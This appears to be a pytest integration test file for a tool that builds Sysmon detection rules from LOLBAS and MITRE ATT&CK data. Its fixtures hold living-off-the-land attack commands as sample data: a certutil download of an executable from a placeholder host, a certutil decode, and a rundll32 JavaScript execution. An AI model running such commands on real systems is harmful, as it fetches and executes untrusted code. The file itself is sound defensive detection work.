"""Integration tests for CLI.

These tests avoid network calls by providing local LOLBAS and MITRE JSON files.
"""

import json
import tempfile
from pathlib import Path

import pytest

from lolbas_sysmon.cli import CLI


@pytest.fixture
def sample_lolbas_json():
    """Sample LOLBAS data for testing."""
    return [
        {
            "Name": "Certutil.exe",
            "OriginalFileName": "CertUtil.exe",
            "Description": "Certificate utility",
            "Commands": [
                {
                    "Command": "certutil.exe -urlcache -f http://example.com/file.exe",
                    "Description": "Download file",
                    "MitreID": "T1105",
                    "Category": "Download",
                },
                {
                    "Command": "certutil.exe -decode input.txt output.exe",
                    "Description": "Decode file",
                    "MitreID": "T1140",
                    "Category": "Decode",
                },
            ],
            "ATT&CK": [{"ID": "T1105"}, {"ID": "T1140"}],
        },
        {
            "Name": "Rundll32.exe",
            "OriginalFileName": "RUNDLL32.EXE",
            "Description": "Run DLL",
            "Commands": [
                {
                    "Command": "rundll32.exe javascript:evil",
                    "Description": "Execute JavaScript",
                    "MitreID": "T1218.011",
                    "Category": "Execute",
                }
            ],
            "ATT&CK": [{"ID": "T1218.011"}],
        },
    ]


@pytest.fixture
def sample_mitre_json(tmp_path: Path) -> Path:
    """Create a minimal MITRE ATT&CK bundle for offline tests."""
    bundle = {
        "objects": [
            {
                "type": "attack-pattern",
                "name": "Ingress Tool Transfer",
                "external_references": [{"external_id": "T1105"}],
            },
            {
                "type": "attack-pattern",
                "name": "Deobfuscate/Decode Files or Information",
                "external_references": [{"external_id": "T1140"}],
            },
            {
                "type": "attack-pattern",
                "name": "System Binary Proxy Execution",
                "external_references": [{"external_id": "T1218"}],
            },
            {
                "type": "attack-pattern",
                "name": "Rundll32",
                "external_references": [{"external_id": "T1218.011"}],
            },
            {
                "type": "attack-pattern",
                "name": "Test Technique 1",
                "external_references": [{"external_id": "T1"}],
            },
            {
                "type": "attack-pattern",
                "name": "Test Technique 2",
                "external_references": [{"external_id": "T2"}],
            },
        ]
    }
    mitre_path = tmp_path / "enterprise-attack.json"
    mitre_path.write_text(json.dumps(bundle), encoding="utf-8")
    return mitre_path


@pytest.fixture
def sample_config_toml():
    """Sample config.toml content."""
    return """
[categories]
enabled = ["Download", "Execute", "Decode"]

[mappings]
"Download" = ["ProcessCreate"]
"Execute" = ["ProcessCreate"]
"Decode" = ["ProcessCreate"]

[event_conditions]
ProcessCreate = ["OriginalFileName", "Image"]

[rule_groups]
prefix = "LOLBAS_"
cmd_prefix = "LOLBAS_CMD_"
unique_rules = false

[lolbas]
json_file = "lolbas.json"
url = "https://lolbas-project.github.io/api/lolbas.json"

[mitre]
json_file = "enterprise-attack.json"
url = "https://example.com/mitre.json"
"""


class TestCLIBasic:
    """Basic CLI integration tests."""

    def test_cli_help(self, capsys):
        """Test CLI help output."""
        cli = CLI()
        with pytest.raises(SystemExit) as exc_info:
            cli.run(["--help"])
        assert exc_info.value.code == 0

    def test_cli_missing_config(self):
        """Test CLI with missing config file."""
        cli = CLI()
        result = cli.run(["-c", "nonexistent_config.toml"])
        assert result == 1

    def test_cli_missing_input_file(self, sample_config_toml):
        """Test CLI with missing input file."""
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.toml"
            config_path.write_text(sample_config_toml, encoding="utf-8")

            cli = CLI()
            result = cli.run(
                [
                    "-c",
                    str(config_path),
                    "-i",
                    "nonexistent_input.xml",
                ]
            )
            assert result == 1


class TestCLIDryRun:
    """CLI dry-run mode tests."""

    def test_dry_run_generates_output(self, sample_lolbas_json, sample_config_toml, sample_mitre_json, capsys):
        """Test dry-run mode prints rules without network calls."""
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.toml"
            config_path.write_text(sample_config_toml, encoding="utf-8")

            lolbas_path = Path(tmpdir) / "lolbas.json"
            lolbas_path.write_text(json.dumps(sample_lolbas_json), encoding="utf-8")

            cli = CLI()
            result = cli.run(
                [
                    "-c",
                    str(config_path),
                    "--lolbas-json",
                    str(lolbas_path),
                    "--mitre-json",
                    str(sample_mitre_json),
                    "--dry-run",
                ]
            )

            captured = capsys.readouterr()
            assert result == 0
            assert "<Sysmon" in captured.out
            assert "RuleGroup" in captured.out


class TestCLIStandaloneGeneration:
    """CLI standalone rule generation tests."""

    def test_generates_xml_file(self, sample_lolbas_json, sample_config_toml, sample_mitre_json):
        """Test generating standalone XML file without network."""
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.toml"
            config_path.write_text(sample_config_toml, encoding="utf-8")

            lolbas_path = Path(tmpdir) / "lolbas.json"
            lolbas_path.write_text(json.dumps(sample_lolbas_json), encoding="utf-8")

            output_path = Path(tmpdir) / "output.xml"

            cli = CLI()
            result = cli.run(
                [
                    "-c",
                    str(config_path),
                    "--lolbas-json",
                    str(lolbas_path),
                    "--mitre-json",
                    str(sample_mitre_json),
                    "-o",
                    str(output_path),
                ]
            )

            assert result == 0
            assert output_path.exists()

            content = output_path.read_text(encoding="utf-8")
            assert "<?xml" in content
            assert "<Sysmon" in content
            assert "CertUtil.exe" in content
            assert "RUNDLL32.EXE" in content

    def test_category_filter(self, sample_lolbas_json, sample_config_toml, sample_mitre_json):
        """Test filtering by specific category."""
        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.toml"
            config_path.write_text(sample_config_toml, encoding="utf-8")

            lolbas_path = Path(tmpdir) / "lolbas.json"
            lolbas_path.write_text(json.dumps(sample_lolbas_json), encoding="utf-8")

            output_path = Path(tmpdir) / "output.xml"

            cli = CLI()
            result = cli.run(
                [
                    "-c",
                    str(config_path),
                    "--lolbas-json",
                    str(lolbas_path),
                    "--mitre-json",
                    str(sample_mitre_json),
                    "--category",
                    "Download",
                    "-o",
                    str(output_path),
                ]
            )

            assert result == 0
            content = output_path.read_text(encoding="utf-8")
            assert "CertUtil.exe" in content
            assert "LOLBAS_Download" in content or "LOLBAS_CMD_Download" in content


class TestCLIUniqueRules:
    """CLI unique-rules flag tests."""

    def test_unique_rules_flag(self, sample_config_toml, sample_mitre_json):
        """Test --unique-rules flag works with local MITRE data."""
        lolbas_data = [
            {
                "Name": "Test.exe",
                "OriginalFileName": "test.exe",
                "Description": "Test",
                "Commands": [
                    {
                        "Command": "test.exe",
                        "Description": "Exec",
                        "MitreID": "T1",
                        "Category": "Execute",
                    },
                    {
                        "Command": "test.exe",
                        "Description": "Download",
                        "MitreID": "T2",
                        "Category": "Download",
                    },
                ],
                "ATT&CK": [],
            }
        ]

        with tempfile.TemporaryDirectory() as tmpdir:
            config_path = Path(tmpdir) / "config.toml"
            config_path.write_text(sample_config_toml, encoding="utf-8")

            lolbas_path = Path(tmpdir) / "lolbas.json"
            lolbas_path.write_text(json.dumps(lolbas_data), encoding="utf-8")

            # Without --unique-rules
            output1 = Path(tmpdir) / "output1.xml"
            cli1 = CLI()
            cli1.run(
                [
                    "-c",
                    str(config_path),
                    "--lolbas-json",
                    str(lolbas_path),
                    "--mitre-json",
                    str(sample_mitre_json),
                    "-o",
                    str(output1),
                ]
            )

            # With --unique-rules
            output2 = Path(tmpdir) / "output2.xml"
            cli2 = CLI()
            cli2.run(
                [
                    "-c",
                    str(config_path),
                    "--lolbas-json",
                    str(lolbas_path),
                    "--mitre-json",
                    str(sample_mitre_json),
                    "--unique-rules",
                    "-o",
                    str(output2),
                ]
            )

            content1 = output1.read_text(encoding="utf-8")
            content2 = output2.read_text(encoding="utf-8")

            # With unique-rules, there should be fewer occurrences of test.exe
            count1 = content1.count("test.exe")
            count2 = content2.count("test.exe")
            assert count2 <= count1
